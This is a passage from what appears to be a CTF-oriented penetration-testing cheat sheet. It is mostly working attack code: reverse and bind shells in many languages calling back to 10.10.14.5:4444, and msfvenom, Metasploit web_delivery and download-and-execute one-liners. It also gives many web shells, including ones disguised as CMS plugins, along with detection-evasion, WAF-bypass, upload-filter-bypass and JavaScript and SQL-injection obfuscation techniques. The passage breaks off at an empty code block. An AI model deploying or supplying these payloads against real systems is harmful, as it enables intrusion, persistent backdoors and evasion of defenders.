python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

**Python PTY Shell (more stable):**

```python
python -c 'import pty,socket,os;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

**Python with Error Handling:**

```python
#!/usr/bin/env python
import socket,subprocess,os
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.14.5",4444))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/sh","-i"])
except:
    pass
```

### PHP Reverse Shells

**PHP exec Method:**

```php
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**PHP Shell_exec:**

```php
php -r '$sock=fsockopen("10.10.14.5",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

**PHP System:**

```php
php -r '$sock=fsockopen("10.10.14.5",4444);system("/bin/sh -i <&3 >&3 2>&3");'
```

**Full PHP Reverse Shell Script:**

```php
<?php
set_time_limit(0);
$ip = '10.10.14.5';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

**PentestMonkey PHP Reverse Shell:**

```bash
# Download from GitHub
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

# Edit IP and port
sed -i 's/127.0.0.1/10.10.14.5/g' php-reverse-shell.php
sed -i 's/1234/4444/g' php-reverse-shell.php

# Upload and execute
```

### Perl Reverse Shells

**Perl One-liner:**

```perl
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Perl Without /bin/sh:**

```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.5:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Ruby Reverse Shells

**Ruby One-liner:**

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.14.5",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

**Ruby Without /bin/sh:**

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.14.5","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### PowerShell Reverse Shells

**PowerShell Basic:**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**PowerShell One-liner (short):**

```powershell
powershell -c "$client = New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**PowerShell Base64 Encoded:**

```powershell
# Encode command
$command = '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444);...'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

# Execute
powershell -enc <base64_string>
```

**Nishang Invoke-PowerShellTcp:**

```powershell
# Download Nishang
git clone https://github.com/samratashok/nishang.git

# Use Invoke-PowerShellTcp.ps1
# Add to end of file:
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444

# Host on web server
python3 -m http.server 80

# Execute on target
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/Invoke-PowerShellTcp.ps1')
```

### Java Reverse Shells

**Java Runtime.exec():**

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.5/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

**Java Reverse Shell Class:**

```java
import java.io.*;
import java.net.*;

public class RevShell {
    public static void main(String[] args) throws Exception {
        String host = "10.10.14.5";
        int port = 4444;
        Process p = new ProcessBuilder("/bin/bash").redirectErrorStream(true).start();
        Socket s = new Socket(host, port);
        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0) so.write(pi.read());
            while(pe.available()>0) so.write(pe.read());
            while(si.available()>0) po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            } catch (Exception e){}
        }
        p.destroy();
        s.close();
    }
}
```

### Node.js Reverse Shells

**Node.js require('child_process'):**

```javascript
require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"')
```

**Node.js Full Script:**

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "10.10.14.5", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

### Upgrading Shells

**TTY Shell Upgrade (Python):**

```bash
# After getting basic shell
python -c 'import pty; pty.spawn("/bin/bash")'

# Or Python 3
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background shell with Ctrl+Z
^Z

# On attacker machine
stty raw -echo; fg

# Press Enter twice

# Set terminal type
export TERM=xterm

# Fix terminal size
stty rows 38 columns 116
```

**Script Command:**

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

**Socat Fully Interactive:**

```bash
# On attacker (download and host socat binary)
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
python3 -m http.server 80

# On target (download socat)
wget http://10.10.14.5/socat -O /tmp/socat
chmod +x /tmp/socat

# Attacker listener
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Target connect
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```

## Bind Shell Techniques

### Concept

Unlike reverse shells (target connects to attacker), bind shells open a port on the target and wait for attacker connection.

### Netcat Bind Shells

**Linux Target:**

```bash
# Target opens listener and binds shell
nc -lvnp 4444 -e /bin/bash

# Alternative without -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash 2>&1 | nc -lvnp 4444 > /tmp/f

# Attacker connects
nc 10.10.10.5 4444
```

**Windows Target:**

```cmd
nc.exe -lvnp 4444 -e cmd.exe
```

### Python Bind Shell

```python
#!/usr/bin/env python
import socket,subprocess,os

HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()
os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

### PHP Bind Shell

```php
<?php
$port = 4444;
$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_bind($sock, 0, $port);
socket_listen($sock);
$client = socket_accept($sock);
socket_write($client, "Connected\n");
$proc = proc_open('/bin/sh', array(0=>$client, 1=>$client, 2=>$client), $pipes);
?>
```

### PowerShell Bind Shell

```powershell
$listener = [System.Net.Sockets.TcpListener]4444;
$listener.Start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```

### MSFVenom Bind Shells

```bash
# Linux x86 bind shell
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f elf -o bind_shell.elf

# Windows bind shell executable
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe

# Raw shellcode
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c
```

## Web Shell Generation

### PHP Web Shells

**Basic PHP Command Execution:**

```php
<?php system($_GET['cmd']); ?>
```

**Usage:**

```
http://target.ctf/shell.php?cmd=whoami
http://target.ctf/shell.php?cmd=ls+-la
http://target.ctf/shell.php?cmd=cat+/etc/passwd
```

**PHP Shell with Output:**

```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

**PHP Multiple Functions:**

```php
<?php
// Try multiple execution methods
if(isset($_GET['cmd'])){
    if(function_exists('system')){
        system($_GET['cmd']);
    } elseif(function_exists('shell_exec')){
        echo shell_exec($_GET['cmd']);
    } elseif(function_exists('exec')){
        exec($_GET['cmd'], $output);
        echo implode("\n", $output);
    } elseif(function_exists('passthru')){
        passthru($_GET['cmd']);
    }
}
?>
```

**Obfuscated PHP Shell:**

```php
<?php @eval($_POST['cmd']); ?>
```

**Base64 Obfuscated:**

```php
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>
```

**PHP Web Shell Generators:**

```bash
# Weevely - generates obfuscated PHP backdoor
weevely generate password123 /tmp/shell.php

# Connect to shell
weevely http://target.ctf/shell.php password123

# Inside weevely
:file_download /etc/passwd
:file_upload /tmp/tool.sh /var/www/tool.sh
:system_info
:net_scan 192.168.1.0/24 22,80,443
```

**p0wny-shell (Full-featured Web Shell):**

```bash
# Download
wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php

# Upload to target
# Access via browser: http://target.ctf/shell.php
```

### ASP/ASPX Web Shells

**Classic ASP:**

```asp
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>
<%= getCommandOutput(Request.QueryString("cmd")) %>
```

**ASPX Web Shell:**

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
void Page_Load(object sender, EventArgs e)
{
    string cmd = Request.QueryString["cmd"];
    if (cmd != null)
    {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();

        string output = p.StandardOutput.ReadToEnd();
        Response.Write("<pre>" + output + "</pre>");
    }
}
</script>
````

**MSFVenom ASPX Shell:**
```bash
# Generate ASPX web shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx

# Set up listener
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; exploit"

# Upload shell.aspx and access via browser
````

### JSP Web Shells

**Basic JSP Command Execution:**

```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    InputStream in = p.getInputStream();
    BufferedReader reader = new BufferedReader(new InputStreamReader(in));
    String line;
    while((line = reader.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>
```

**JSP File Upload:**

```jsp
<%@ page language="java" contentType="text/html" pageEncoding="UTF-8"%>
<%@ page import="java.io.*" %>
<%
String savePath = request.getParameter("path");
if(savePath == null) savePath = "/tmp/";
String filename = request.getParameter("filename");
if(filename != null) {
    File file = new File(savePath + filename);
    FileOutputStream fos = new FileOutputStream(file);
    String content = request.getParameter("content");
    fos.write(content.getBytes());
    fos.close();
    out.println("File uploaded: " + file.getAbsolutePath());
}
%>
```

**MSFVenom JSP Shell:**

```bash
# Generate JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.jsp

# Or WAR file for Tomcat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war
```

### Python CGI Web Shell

```python
#!/usr/bin/env python
import cgi
import subprocess

print("Content-Type: text/html\n")
form = cgi.FieldStorage()
cmd = form.getvalue('cmd')

if cmd:
    print("<pre>")
    result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    print(result.decode())
    print("</pre>")
else:
    print("No command specified")
```

### Perl CGI Web Shell

```perl
#!/usr/bin/perl
use CGI;
my $cgi = CGI->new();
print $cgi->header('text/html');
my $cmd = $cgi->param('cmd');
if($cmd) {
    print "<pre>";
    print `$cmd`;
    print "</pre>";
}
```

### Node.js Web Shell

```javascript
const http = require('http');
const { exec } = require('child_process');
const url = require('url');

const server = http.createServer((req, res) => {
    const query = url.parse(req.url, true).query;
    if(query.cmd) {
        exec(query.cmd, (error, stdout, stderr) => {
            res.writeHead(200, {'Content-Type': 'text/plain'});
            res.end(stdout + stderr);
        });
    } else {
        res.writeHead(200, {'Content-Type': 'text/plain'});
        res.end('Specify ?cmd=command');
    }
});

server.listen(8080);
```

### Advanced Web Shell Features

**File Browser Web Shell:**

```php
<?php
$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
echo "<h2>Directory: $dir</h2>";
echo "<pre>";
$files = scandir($dir);
foreach($files as $file) {
    $fullpath = $dir . '/' . $file;
    if(is_dir($fullpath)) {
        echo "[DIR]  <a href='?dir=$fullpath'>$file</a>\n";
    } else {
        echo "[FILE] <a href='?file=$fullpath'>$file</a> (" . filesize($fullpath) . " bytes)\n";
    }
}
echo "</pre>";

if(isset($_GET['file'])) {
    echo "<hr><pre>";
    echo htmlspecialchars(file_get_contents($_GET['file']));
    echo "</pre>";
}

if(isset($_GET['cmd'])) {
    echo "<hr><pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```

**File Upload Web Shell:**

```php
<?php
if(isset($_FILES['file'])) {
    $target = $_FILES['file']['name'];
    if(move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        echo "File uploaded: $target";
    }
}
?>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
```

**Reverse Shell Web Shell (PHP):**

```php
<?php
if(isset($_GET['rev'])){
    $ip = '10.10.14.5';
    $port = 4444;
    $sock = fsockopen($ip, $port);
    $proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
}
?>
```

**Usage:**

```
http://target.ctf/shell.php?rev=1
```

### China Chopper Web Shell

**PHP Version:**

```php
<?php @eval($_POST['pass']);?>
```

**Client Connection:**

```bash
# Using custom China Chopper client (GUI tool)
# Or via curl:
curl -d "pass=system('whoami');" http://target.ctf/shell.php
curl -d "pass=system('ls -la');" http://target.ctf/shell.php
curl -d "pass=system('cat /etc/passwd');" http://target.ctf/shell.php
```

### Web Shell Obfuscation Techniques

**Variable Functions (PHP):**

```php
<?php
$a = 'sys';
$b = 'tem';
$c = $a.$b;
$c($_GET['cmd']);
?>
```

**String Manipulation:**

```php
<?php
$func = str_rot13('flfgrz');  // Decodes to 'system'
$func($_GET['cmd']);
?>
```

**Array Callback:**

```php
<?php
$a = [0 => 'system'];
$a[0]($_GET['cmd']);
?>
```

**Assert Backdoor (PHP < 7.2):**

```php
<?php
@assert($_POST['cmd']);
?>
```

**Usage:**

```bash
curl -d "cmd=system('whoami');" http://target.ctf/shell.php
```

**Preg_replace Execution (PHP < 5.5):**

```php
<?php
preg_replace('/test/e', $_GET['cmd'], 'test');
?>
```

**Create_function Backdoor:**

```php
<?php
$func = create_function('', $_GET['cmd']);
$func();
?>
```

### WAF Bypass Techniques for Web Shells

**Encoding GET Parameters:**

```php
<?php system($_GET[base64_decode('Y21k')]); ?>
// Access: ?Y21k=whoami
```

**Hex Encoding:**

```php
<?php system($_GET["\x63\x6d\x64"]); ?>
// Access: ?cmd=whoami
```

**Concatenation:**

```php
<?php
$s='sy'.'st'.'em';
$s($_GET['c']);
?>
```

**Variable Variables:**

```php
<?php
${'_'.$_}='system';
$_='G'.'E'.'T';
${'_'.$_}['cmd']='whoami';
${'_GET'}=&${'_'.$_};
${'_'.$_}=${${'_'.$_}['cmd']};
?>
```

### Metasploit Web Delivery

**Generate and Host Payload:**

```bash
# Start Metasploit
msfconsole

# Use web_delivery module
use exploit/multi/script/web_delivery

# Set options
set payload php/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set target 1  # PHP
exploit

# Metasploit provides command to execute on target:
# php -d allow_url_fopen=true -r "eval(file_get_contents('http://10.10.14.5:8080/XXXXXX'));"
```

**Python Web Delivery:**

```bash
use exploit/multi/script/web_delivery
set payload python/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set target 0  # Python
exploit

# Execute on target:
# python -c "import urllib;exec(urllib.urlopen('http://10.10.14.5:8080/XXXXXX').read())"
```

**PowerShell Web Delivery:**

```bash
use exploit/multi/script/web_delivery
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set target 2  # PowerShell
exploit

# Execute on target:
# powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.14.5:8080/XXXXXX'))"
```

### Web Shell via File Upload

**Testing File Upload Restrictions:**

```bash
# Try different extensions
shell.php
shell.php5
shell.php7
shell.phtml
shell.phar
shell.phps
shell.php.jpg
shell.jpg.php
shell.php%00.jpg  # Null byte injection (older PHP)
shell.php%0a.jpg  # Newline
shell.php;.jpg
shell.php.....
shell.php/
shell.php.\
```

**Content-Type Manipulation:**

```bash
# Upload with modified Content-Type header
curl -F "file=@shell.php;type=image/jpeg" http://target.ctf/upload.php
```

**Magic Bytes Bypass:**

```php
GIF89a
<?php system($_GET['cmd']); ?>
```

```bash
# Save as shell.php with GIF header
printf 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.php

# Upload as image, access as PHP
```

**Double Extension:**

```bash
# Upload: shell.jpg.php
# Server may check only first extension
```

**Case Manipulation:**

```bash
shell.pHp
shell.PhP
shell.PHP
```

**Polyglot Files:**

```bash
# Create valid JPEG that's also valid PHP
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php.jpg

# Upload and access
http://target.ctf/uploads/shell.php.jpg?cmd=whoami
```

### Web Shell via Path Traversal

**Upload to Different Directory:**

```bash
# Filename manipulation
../../shell.php
....//....//shell.php
..%2f..%2fshell.php

# Upload to web root or accessible directory
```

**Testing with Burp:**

```
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="../../shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

### Web Shell via .htaccess

**Upload .htaccess:**

```apache
AddType application/x-httpd-php .jpg
```

**Then upload:**

```
shell.jpg containing: <?php system($_GET['cmd']); ?>
```

**Alternative .htaccess:**

```apache
<FilesMatch "shell.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

### Web Shell via web.config (IIS)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers>
         <add name="PHP via FastCGI" path="*.jpg" verb="*" modules="FastCgiModule" scriptProcessor="C:\PHP\php-cgi.exe" resourceType="Unspecified" />
      </handlers>
   </system.webServer>
</configuration>
```

### Automated Web Shell Detection Evasion

**Time-based Evasion:**

```php
<?php
if(time() % 2 == 0) {
    system($_GET['cmd']);
}
?>
```

**Cookie-based Authentication:**

```php
<?php
if($_COOKIE['auth'] == md5('secret123')) {
    system($_GET['cmd']);
}
?>
```

**Access:**

```bash
curl -b "auth=2bb80d537b1da3e38bd30361aa855686" "http://target.ctf/shell.php?cmd=whoami"
```

**Referrer Check:**

```php
<?php
if($_SERVER['HTTP_REFERER'] == 'http://legitsite.com') {
    system($_GET['cmd']);
}
?>
```

**User-Agent Check:**

```php
<?php
if($_SERVER['HTTP_USER_AGENT'] == 'CustomAgent/1.0') {
    system($_GET['cmd']);
}
?>
```

### Web Shell Tunneling

**Piping Through Web Shell:**

```bash
# Use web shell as proxy for internal network access
# Requires custom client script

# Example with reGeorg:
git clone https://github.com/sensepost/reGeorg.git
cd reGeorg

# Upload tunnel.php to target
# Create SOCKS proxy locally
python reGeorgSocksProxy.py -u http://target.ctf/tunnel.php -p 8080

# Use proxychains
proxychains nmap -sT 192.168.1.0/24
proxychains ssh internal_user@192.168.1.10
```

### Framework-Specific Web Shells

**WordPress Plugin Shell:**

```php
<?php
/*
Plugin Name: Backup Manager
Description: Manages backups
Version: 1.0
Author: Admin
*/

if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

**Save as:** `wp-content/plugins/backup-manager/backup-manager.php`

**Drupal Module Shell:**

```php
<?php
function backup_menu() {
    $items = array();
    $items['backup'] = array(
        'title' => 'Backup',
        'page callback' => 'backup_page',
        'access arguments' => array('access content'),
        'type' => MENU_CALLBACK,
    );
    return $items;
}

function backup_page() {
    if(isset($_GET['cmd'])) {
        return '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
    }
}
?>
```

**Joomla Component Shell:**

```php
<?php
defined('_JEXEC') or die('Restricted access');

if(isset($_GET['cmd'])) {
    echo '<pre>';
    system($_GET['cmd']);
    echo '</pre>';
}
?>
```

### Memory-Only Web Shells

**[Inference] Some advanced web shells attempt to reside only in memory to avoid disk-based detection. Implementation varies by platform and requires specific server configurations.**

**PHP Memory Shell Concept:**

```php
<?php
// Register as error handler
set_error_handler(function($errno, $errstr) {
    if(strpos($errstr, 'cmd:') !== false) {
        $cmd = substr($errstr, 4);
        echo system($cmd);
    }
});

// Trigger via user-agent or other input
trigger_error('cmd:' . $_SERVER['HTTP_USER_AGENT'], E_USER_NOTICE);
?>
```

**Critical Related Topics:**

- **Buffer Overflow Exploitation**: Stack-based and heap-based overflows, return-oriented programming (ROP), address space layout randomization (ASLR) bypass
- **Format String Vulnerabilities**: Reading and writing arbitrary memory, exploitation techniques for various architectures
- **Return-Oriented Programming (ROP)**: Building ROP chains, gadget finding with ROPgadget and ropper, bypassing DEP/NX
- **Heap Exploitation**: Use-after-free, heap spraying, heap overflow techniques, tcache and fastbin attacks
- **ASLR/DEP/PIE Bypass**: Information leaks, partial overwrites, ret2plt, ret2libc techniques
- **Shellcode Encoding**: Alphanumeric, Unicode, polymorphic encoders for IDS/AV evasion
- **Metasploit Framework**: Custom module development, meterpreter scripting, post-exploitation automation
- **Post-Exploitation**: Privilege escalation shells, persistence mechanisms, lateral movement payloads, data exfiltration methods

---

## Obfuscated Payloads

Obfuscation transforms payloads to bypass filters, WAFs, and signature-based detection while maintaining functionality. These techniques are used in authorized security testing contexts.

### JavaScript Obfuscation

**String Concatenation:**

```javascript
// Original
alert(document.cookie)

// Obfuscated - string concatenation
eval('ale'+'rt(doc'+'ument.coo'+'kie)')

// Using array join
eval(['ale','rt(doc','ument.coo','kie)'].join(''))

// Character codes
eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))
```

**Encoding Methods:**

```javascript
// Base64 encoding
eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))

// Hex encoding
eval(unescape('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29'))

// Unicode escape sequences
eval('\u0061\u006c\u0065\u0072\u0074(document.cookie)')

// Octal sequences
eval('\141\154\145\162\164(document.cookie)')
```

**JSFuck (Extreme Obfuscation):**

```javascript
// Uses only 6 characters: []()!+
// Example: alert(1)
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
```

**Tools for JS Obfuscation:**

```bash
# JavaScript Obfuscator
npm install -g javascript-obfuscator
javascript-obfuscator payload.js --output obfuscated.js

# Online tools (in CTF documentation):
# - obfuscator.io
# - beautifytools.com/javascript-obfuscator.php
```

**Python Script for Custom JS Obfuscation:**

```python
#!/usr/bin/env python3

def js_char_code_encode(payload):
    """Convert JavaScript to String.fromCharCode"""
    char_codes = ','.join(str(ord(c)) for c in payload)
    return f"eval(String.fromCharCode({char_codes}))"

def js_hex_encode(payload):
    """Convert to hex escape sequences"""
    hex_encoded = ''.join(f'\\x{ord(c):02x}' for c in payload)
    return f"eval(unescape('{hex_encoded}'))"

def js_unicode_encode(payload):
    """Convert to unicode escape sequences"""
    unicode_encoded = ''.join(f'\\u{ord(c):04x}' for c in payload)
    return f"eval('{unicode_encoded}')"

def js_split_concat(payload, chunk_size=3):
    """Split into chunks and concatenate"""
    chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
    joined = "'+'.join(['" + "','".join(chunks) + "'])"
    return f"eval({joined})"

# Usage
original = "alert(document.cookie)"
print("Original:", original)
print("\nChar codes:", js_char_code_encode(original))
print("\nHex:", js_hex_encode(original))
print("\nUnicode:", js_unicode_encode(original))
print("\nSplit:", js_split_concat(original))
```

### SQL Injection Obfuscation

**Comment Insertion:**

```sql
-- Original
' OR 1=1--

-- Obfuscated with comments
'/**/OR/**/1=1--
'/*!OR*/1=1--
'/*foo*/OR/*bar*/1/*baz*/=/*qux*/1--

-- MySQL version-specific comments
'/*!50000OR*/1=1--
```

**Case Variation:**

```sql
-- Mixed case
' Or 1=1--
' oR 1=1--
' OR 1=1--

-- Alternating case
' Or 1=1--
```

**Whitespace Manipulation:**

```sql
-- Tab characters
'%09OR%091=1--

-- Newline
'%0AOR%0A1=1--

-- Multiple spaces
'  OR  1=1--

-- Mixed whitespace
'%09%0AOR%0A%091=1--
```

**Encoding Techniques:**

```sql
-- URL encoding
'%20OR%201=1--

-- Double URL encoding
'%2520OR%25201=1--

-- Hex encoding (MySQL)
' OR 0x31=0x31--

-- Char function
' OR CHAR(49)=CHAR(49)--

-- ASCII function
' OR ASCII('A')=65--
```

**String Concatenation:**

```sql
-- MySQL
' OR 'a'='a' AND 'b'='b'--
' OR CONCAT('a','dmin')='admin'--

-- PostgreSQL
' OR 'a'||'dmin'='admin'--

-- MSSQL
' OR 'a'+'dmin'='admin'--
```

**Alternative Operators:**

```sql
-- Instead of = use LIKE
' OR 'a' LIKE 'a'--

-- Instead of OR use ||
' || 1--

-- Instead of AND use &&
' && 1--

-- Use BETWEEN
' OR 1 BETWEEN 0 AND 2--

-- Use IN
' OR 1 IN (1,2,3)--
```

**Python SQL Obfuscation Script:**

```python
